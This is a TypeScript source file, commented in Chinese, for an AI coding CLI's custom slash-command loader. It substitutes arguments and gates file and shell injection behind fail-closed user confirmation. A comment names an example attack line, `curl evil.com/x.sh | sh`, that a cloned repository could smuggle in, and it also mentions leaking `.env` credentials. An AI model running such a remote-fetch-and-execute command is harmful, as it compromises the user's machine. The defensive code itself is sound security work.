/**
 * 自定义斜杠命令
 * 从 .sid-code/commands/*.md 加载用户自定义命令
 * 支持：$1/$@/{{args}} 参数替换、@{path} 文件注入、!{cmd} Shell 注入
 */

import type { Command, AppContext, CommandResult } from "./types.ts";
import { ExtensionLoader } from "@sid-code/core/extension/loader.ts";
import type { ScanOptions } from "@sid-code/core/extension/types.ts";
import { getLogger } from "@sid-code/core/debug/logger.ts";
import { isPolicyAllowed } from "@sid-code/core/config/policy-limits.ts";
import { PROTECTED_COMMAND_NAMES } from "@sid-code/core/command-contract/protected-names.ts";
import { matchesSensitivePath } from "@sid-code/core/permission/path-validator.ts";
import { splitShellWords } from "@sid-code/core/tool/bash/parser.ts";
import { execSync } from "child_process";
import { closeSync, openSync, readFileSync, readSync, realpathSync, statSync } from "fs";
import { isAbsolute, relative, resolve, sep } from "path";

/**
 * 保护命令名：单一事实源已下沉到 core（D7），注册表 dedupe 对所有非内置来源统一拦截。
 * 这里保留加载期的早拦，是为了 legacy 回退路径（cli.ts 直接 register 进旧 Registry，
 * 不经 UnifiedCommandRegistry）也受保护。
 */
const PROTECTED_NAMES = PROTECTED_COMMAND_NAMES;

/**
 * 从 markdown 第一行 HTML 注释提取描述
 * 格式：<!-- 这是描述 -->
 */
function extractDescription(body: string): string {
  const match = body.trimStart().match(/^<!--\s*(.*?)\s*-->/);
  return match?.[1] ?? "";
}

/**
 * P2-2：自定义命令 frontmatter 高级字段（对齐 claude-code）。
 * - argumentHint：补全时显示的参数提示（frontmatter key: argument-hint）。
 * - allowedTools：限定 prompt 执行时可用工具集，非空则走 fork 子代理隔离执行。
 * - model：指定该命令用哪个模型执行（仅 fork 路径生效）。
 */
export interface CustomCommandOptions {
  argumentHint?: string;
  allowedTools?: string[];
  model?: string;
}

/**
 * 从 frontmatter 解析高级字段（含 CC 的连字符 key 与本项目驼峰 key 双写兼容）。
 * allowed-tools 支持逗号分隔字符串或数组两种写法（对齐 skill/loader.ts）。
 */
export function parseCustomCommandOptions(
  frontmatter: Record<string, unknown>,
): CustomCommandOptions {
  const opts: CustomCommandOptions = {};

  const hint = frontmatter["argument-hint"] ?? frontmatter["argumentHint"];
  if (typeof hint === "string" && hint.trim()) {
    opts.argumentHint = hint.trim();
  }

  const rawTools =
    frontmatter["allowed-tools"] ?? frontmatter["allowedTools"] ?? frontmatter["tools"];
  if (typeof rawTools === "string" && rawTools.trim()) {
    opts.allowedTools = rawTools
      .split(",")
      .map((s) => s.trim())
      .filter(Boolean);
  } else if (Array.isArray(rawTools)) {
    opts.allowedTools = rawTools
      .map(String)
      .map((s) => s.trim())
      .filter(Boolean);
  }

  const model = frontmatter["model"];
  if (typeof model === "string" && model.trim()) {
    opts.model = model.trim();
  }

  return opts;
}

/** 文件注入单文件读取上限（与 shell 注入 maxBuffer 同口径）；超出部分截断并提示（D15） */
const FILE_INJECTION_MAX_BYTES = 10 * 1024 * 1024;

/**
 * 文件注入 `@{path}` 的放行判定（D15）。
 *
 * 修复前是裸 `resolve(cwd, path)` + `readFileSync`：无确认、无路径边界、无大小上限，
 * 与相邻 30 行的 shell 注入（fail-closed 确认 + timeout + maxBuffer）待遇不对称。
 * `.sid-code/commands/*.md` 随 git 分发，一行 `@{.env}` 就能让凭据静默进 prompt 出网。
 *
 * 分档：cwd 内的普通文件直接放行；**cwd 外**或**命中敏感文件模式**（复用权限系统的
 * `matchesSensitivePath`，不另写一套）需要用户确认。
 */
function classifyFileInjection(
  filePath: string,
  cwd: string,
): { absPath: string; needsConfirm: boolean; reason?: string } {
  let absPath = resolve(cwd, filePath);
  let realCwd = cwd;
  try {
    // symlink 解到真实路径再判边界，否则 cwd 内一个指向 ~/.ssh 的链接能绕过
    absPath = realpathSync(absPath);
    realCwd = realpathSync(cwd);
  } catch {
    // 文件不存在：交给后续读取报错
  }
  const rel = relative(realCwd, absPath);
  const outside = rel === ".." || rel.startsWith(`..${sep}`) || isAbsolute(rel);
  if (outside) return { absPath, needsConfirm: true, reason: "位于项目目录之外" };
  if (matchesSensitivePath(absPath)) {
    return { absPath, needsConfirm: true, reason: "命中敏感文件模式" };
  }
  return { absPath, needsConfirm: false };
}

/** 读取至多 FILE_INJECTION_MAX_BYTES，超出时截断（不整文件进内存） */
function readCapped(absPath: string): { content: string; truncatedFrom?: number } {
  const size = statSync(absPath).size;
  if (size <= FILE_INJECTION_MAX_BYTES) return { content: readFileSync(absPath, "utf-8") };
  const buf = Buffer.alloc(FILE_INJECTION_MAX_BYTES);
  const fd = openSync(absPath, "r");
  try {
    readSync(fd, buf, 0, FILE_INJECTION_MAX_BYTES, 0);
  } finally {
    closeSync(fd);
  }
  return { content: buf.toString("utf-8"), truncatedFrom: size };
}

/** 模板片段：字面文本（参数替换只作用于它）或注入表达式 */
type TemplateSegment =
  | { kind: "text"; text: string }
  | { kind: "file"; raw: string; path: string }
  | { kind: "shell"; raw: string; cmd: string };

/** 在**原始模板**上切出注入表达式（D14：用户参数永远不参与扫描） */
function splitTemplate(template: string): TemplateSegment[] {
  const PATTERN = /@\{([^}]+)\}|!\{([^}]+)\}/g;
  const segments: TemplateSegment[] = [];
  let last = 0;
  for (const m of template.matchAll(PATTERN)) {
    const idx = m.index ?? 0;
    if (idx > last) segments.push({ kind: "text", text: template.slice(last, idx) });
    if (m[1] !== undefined) segments.push({ kind: "file", raw: m[0], path: m[1].trim() });
    else segments.push({ kind: "shell", raw: m[0], cmd: m[2].trim() });
    last = idx + m[0].length;
  }
  if (last < template.length) segments.push({ kind: "text", text: template.slice(last) });
  return segments;
}

/**
 * 处理文件注入 @{path}（D15：cwd 外 / 敏感文件需确认，fail-closed；读取有上限；留日志）。
 * 返回 null 表示用户拒绝（或无确认通道）。文件读不到时抛错。
 */
async function processFileInjections(
  segments: TemplateSegment[],
  ctx: AppContext,
): Promise<Map<TemplateSegment, string> | null> {
  const log = getLogger();
  const out = new Map<TemplateSegment, string>();
  const files = segments.filter(
    (s): s is Extract<TemplateSegment, { kind: "file" }> => s.kind === "file",
  );
  if (files.length === 0) return out;

  const cwd = process.cwd();
  const judged = files.map((seg) => ({ seg, ...classifyFileInjection(seg.path, cwd) }));
  const risky = judged.filter((j) => j.needsConfirm);
  if (risky.length > 0) {
    // 与 shell 注入同取向：无确认通道 = 拒绝；回调抛异常 = 拒绝。
    if (!ctx.requestUserConfirmation) {
      log.warn("CUSTOM_CMD", "文件注入需确认但无确认通道，拒绝读取", {
        paths: risky.map((r) => r.absPath),
      });
      return null;
    }
    const desc =
      "自定义命令请求把以下文件内容注入对话（将发送给模型）：\n" +
      risky.map((r) => `  ${r.absPath}（${r.reason}）`).join("\n");
    let ok: boolean;
    try {
      ok = await ctx.requestUserConfirmation(desc);
    } catch (err: any) {
      log.warn("CUSTOM_CMD", `文件注入确认回调异常，保守拒绝: ${err?.message}`);
      return null;
    }
    if (!ok) return null;
  }

  for (const j of judged) {
    let read: { content: string; truncatedFrom?: number };
    try {
      read = readCapped(j.absPath);
    } catch {
      throw new Error(`文件注入失败：无法读取 "${j.seg.path}"`);
    }
    log.info("CUSTOM_CMD", `文件注入: ${j.absPath}`, {
      bytes: read.truncatedFrom ?? Buffer.byteLength(read.content),
      truncated: read.truncatedFrom !== undefined,
      confirmed: j.needsConfirm,
    });
    const ext = j.seg.path.split(".").pop() ?? "";
    const note =
      read.truncatedFrom !== undefined
        ? `\n... [文件共 ${read.truncatedFrom} 字节，已截断到前 ${FILE_INJECTION_MAX_BYTES} 字节]`
        : "";
    out.set(
      j.seg,
      `以下是文件 \`${j.seg.path}\` 的内容：\n\`\`\`${ext}\n${read.content}${note}\n\`\`\``,
    );
  }
  return out;
}

/**
 * 处理 Shell 注入 !{cmd}
 * 执行 shell 命令并将输出替换到模板中；必须经 ctx.confirmShellCommands 确认（fail-closed）。
 * 返回 null 表示未确认。
 */
async function processShellInjections(
  segments: TemplateSegment[],
  ctx: AppContext,
): Promise<Map<TemplateSegment, string> | null> {
  const out = new Map<TemplateSegment, string>();
  const shells = segments.filter(
    (s): s is Extract<TemplateSegment, { kind: "shell" }> => s.kind === "shell",
  );
  if (shells.length === 0) return out;

  const commands = shells.map((s) => s.cmd);

  // P2-3：无确认通道 → **拒绝执行**（fail-closed），不再静默直执行。
  //
  // `!{cmd}` 是一个真实的代码执行面：`.sid-code/commands/` 随版本库分发，
  // clone 一个仓库就可能带进来一个 `!{curl evil.com/x.sh | sh}`。修复前这段是
  // `if (ctx.confirmShellCommands) { ... }` —— 回调没注入就整段跳过，然后无条件
  // execSync。它的正确性依赖"每一条现在和将来的路径都记得注入那个回调"。
  //
  // 生产路径本来就注入了真实弹窗（app.ts + adapter.ts 双向透传），所以**行为零变化**；
  // 收益是把安全从约定变成结构。取向对齐 Skill 侧的 resolveSkillAsk：
  // 那里三条兜底路径全部 return false，连"回调自己抛异常"都保守拒绝。
  //
  // D14：命令列表只来自原始模板（splitTemplate 在参数替换之前切分），所以确认框里
  // 展示的一定是模板作者写的命令，不会混进用户参数里的 `!{...}`。
  if (!ctx.confirmShellCommands) {
    getLogger().warn("CUSTOM_CMD", "shell 注入需确认但无确认通道，拒绝执行");
    return null;
  }
  let confirmed: boolean;
  try {
    confirmed = await ctx.confirmShellCommands(commands);
  } catch (err: any) {
    // 回调自身抛异常也保守拒绝：异常不能等于放行。
    getLogger().warn("CUSTOM_CMD", `shell 注入确认回调异常，保守拒绝: ${err?.message}`);
    return null;
  }
  if (!confirmed) return null;

  for (const seg of shells) {
    try {
      const output = execSync(seg.cmd, {
        encoding: "utf-8",
        timeout: 10_000,
        maxBuffer: 10 * 1024 * 1024, // 10MB
      });
      // 截断超长输出
      const truncated =
        output.length > 10000 ? output.slice(0, 10000) + "\n... [输出已截断]" : output;
      out.set(seg, truncated.trimEnd());
    } catch (err: any) {
      const errMsg = err.stderr ? err.stderr.toString().trim() : err.message;
      out.set(seg, `[命令执行失败: ${errMsg}]`);
    }
  }
  return out;
}

/**
 * 参数占位符替换（D16），只作用于模板字面文本。
 *
 * - `$ARGUMENTS` / `$@` / `$*` / `{{args}}`：全部参数原文；
 * - `$1`..`$9`：**单位数**（shell 惯例）。修复前是 `\d+`，`第 $10 项` 被当成第 10 个参数；
 * - `$0`、越界的 `$N`：**保留字面量**。修复前静默变空串，prompt 少一块却看不出来；
 *   保留字面量既让人看得见，又不妨碍可选参数用法；
 * - 位置参数按 shell 规则切分（认引号），`"a b" c` 的 `$1` 是 `a b`。
 *
 * 单趟正则替换：已代入的参数文本不会被后续规则再次替换（参数里写 `$1` 不会被展开）。
 */
function substituteArgs(text: string, args: string): string {
  const all = args.trim();
  let parts: string[] | null = null;
  return text.replace(/\$ARGUMENTS\b|\$@|\$\*|\{\{args\}\}|\$(\d)/g, (match, digit) => {
    if (digit === undefined) return all;
    const i = Number(digit) - 1;
    parts ??= splitShellWords(all);
    if (i < 0 || i >= parts.length) return match;
    return parts[i];
  });
}

/**
 * 处理完整模板（D14）：先在**原始模板**上处理文件注入与 Shell 注入，最后才插入用户参数。
 *
 * 修复前顺序是「参数替换 → 文件注入 → Shell 注入」，第 2、3 步扫的是第 1 步的产物，
 * 于是用户参数里的 `!{...}` / `@{...}` 被当成模板作者写的注入语法执行，
 * shell 确认框里展示的命令也可能来自用户自己刚敲的参数 —— 确认的前提被打破。
 * 代价（刻意接受）：`@{$1}` 这种「参数决定注入目标」的写法不再生效。
 *
 * 注入结果原样拼回、不参与参数替换：文件内容 / 命令输出里的 `$1` 不会被展开。
 */
async function processTemplate(
  template: string,
  args: string,
  ctx: AppContext,
): Promise<{ text: string; confirmed: boolean; rejected?: "file" | "shell" }> {
  const segments = splitTemplate(template);

  // 1. 文件注入 @{path}（cwd 外 / 敏感文件需确认）
  const files = await processFileInjections(segments, ctx);
  if (!files) return { text: template, confirmed: false, rejected: "file" };

  // 2. Shell 注入 !{cmd}（需用户确认）
  const shells = await processShellInjections(segments, ctx);
  if (!shells) return { text: template, confirmed: false, rejected: "shell" };

  // 3. 最后才插入用户参数：此时注入扫描已结束，参数里的 !{} @{} 只是普通文本
  const text = segments
    .map((seg) =>
      seg.kind === "text" ? substituteArgs(seg.text, args) : (files.get(seg) ?? shells.get(seg)!),
    )
    .join("");
  return { text, confirmed: true };
}

/** 自定义命令实现 */
export class CustomCommand implements Command {
  private _name: string;
  private _description: string;
  private _body: string;
  private _options: CustomCommandOptions;

  constructor(name: string, description: string, body: string, options: CustomCommandOptions = {}) {
    this._name = name;
    this._description = description;
    this._body = body;
    this._options = options;
  }

  name(): string {
    return this._name;
  }
  aliases(): string[] {
    return [];
  }
  description(): string {
    return this._description || `自定义命令: ${this._name}`;
  }
  // P2-2：frontmatter argument-hint 透出到补全（adapter 会取 argumentHint()）。
  argumentHint(): string {
    return this._options.argumentHint ?? "";
  }

  async execute(args: string, ctx: AppContext): Promise<CommandResult> {
    let text: string;
    let confirmed: boolean;
    let rejected: "file" | "shell" | undefined;

    try {
      ({ text, confirmed, rejected } = await processTemplate(this._body, args, ctx));
    } catch (err: any) {
      return { kind: "error", message: err.message };
    }

    if (!confirmed) {
      return {
        kind: "message",
        message:
          rejected === "file" ? "已取消：用户拒绝注入文件内容" : "已取消：用户拒绝执行 Shell 命令",
      };
    }

    // P2-2：声明了 allowed-tools 或 model 时走 fork 子代理隔离执行——
    // 限定工具集 + 指定模型，返回子代理最终输出。否则维持 inline 注入当前对话。
    const { allowedTools, model } = this._options;
    if ((allowedTools && allowedTools.length > 0) || model) {
      return this.executeFork(text, ctx, allowedTools, model);
    }

    return { kind: "submit_prompt", prompt: text };
  }

  /** fork 模式：在受限子代理中执行 prompt（复用 SubAgent.executeCustom）。 */
  private async executeFork(
    prompt: string,
    ctx: AppContext,
    allowedTools?: string[],
    model?: string,
  ): Promise<CommandResult> {
    const log = getLogger();
    if (!ctx.providerRegistry) {
      // 无 ProviderRegistry（如无头精简环境）时退回 inline，保证命令仍可用。
      log.warn("CUSTOM_CMD", `fork 命令 /${this._name} 无 providerRegistry，退回 inline`);
      return { kind: "submit_prompt", prompt };
    }
    try {
      const { SubAgent } = await import("@sid-code/core/agent/sub-agent.ts");
      const subAgent = SubAgent.fromRegistry(
        ctx.providerRegistry,
        ctx.registry, // AppContext 的 ToolRegistry 字段名为 registry
        ctx.hookSystem,
        model, // modelOverride：未指定则用主模型
      );
      const result = await subAgent.executeCustom({
        systemPrompt: "你是一个专注的助手，请完成以下任务。",
        userPrompt: prompt,
        allowedTools: allowedTools ?? [],
        maxTurns: 30,
        type: "custom-command",
      });
      if (!result.success) {
        return { kind: "error", message: result.output || "自定义命令执行失败" };
      }
      return { kind: "message", message: result.output };
    } catch (err: any) {
      log.error("CUSTOM_CMD", `fork 执行失败 /${this._name}: ${err?.message}`);
      // fork 出错兜底回 inline，避免命令完全不可用。
      return { kind: "submit_prompt", prompt };
    }
  }
}

/** 自定义命令加载器 */
export class CustomCommandLoader {
  private extensionLoader: ExtensionLoader;

  constructor(extensionLoader?: ExtensionLoader) {
    this.extensionLoader = extensionLoader ?? new ExtensionLoader();
  }

  /**
   * 加载所有自定义命令
   * @param projectDir 项目目录（用于区分 user/project 来源）
   * @param scanOptions 扫描选项（信任检查等）
   */
  async loadAll(
    projectDir?: string,
    scanOptions?: ScanOptions,
  ): Promise<Array<{ cmd: CustomCommand; source: "user" | "project" }>> {
    const log = getLogger();
    // P1（policyLimits 接线）：企业策略禁用自定义命令。
    //
    // 闸门放在 loadAll 而不是两个调用方（`command/loaders.ts` 的新命令系统 +
    // `cli.ts` 的 legacy 回退路径）：那样要写两遍，且日后第三个入口会静默绕过。
    // 返回空数组是**已有的正常路径**（用户没有 commands 目录时就是这个结果），
    // 上层 `loadAllCommands` 本身也 `.catch(() => [])`，不会崩。内置命令不受影响。
    if (!isPolicyAllowed("custom_commands")) {
      log.info("CUSTOM_CMD", "自定义命令已被企业策略禁用，跳过加载");
      return [];
    }
    const files = await this.extensionLoader.scan(
      "commands",
      projectDir ?? process.cwd(),
      scanOptions,
    );
    const results: Array<{ cmd: CustomCommand; source: "user" | "project" }> = [];

    for (const file of files) {
      if (PROTECTED_NAMES.has(file.name)) {
        log.warn("CUSTOM_CMD", `跳过保护命令名: ${file.name}`);
        continue;
      }

      const description = (file.frontmatter.description as string) || extractDescription(file.body);
      // P2-2：解析 argument-hint / allowed-tools / model 高级字段。
      const options = parseCustomCommandOptions(file.frontmatter);
      const cmd = new CustomCommand(file.name, description, file.body, options);
      const source: "user" | "project" = file.source === "user" ? "user" : "project";
      results.push({ cmd, source });
    }

    if (results.length > 0) {
      log.info("CUSTOM_CMD", `加载了 ${results.length} 个自定义命令`, {
        names: results.map((r) => r.cmd.name()),
      });
    }

    return results;
  }
}
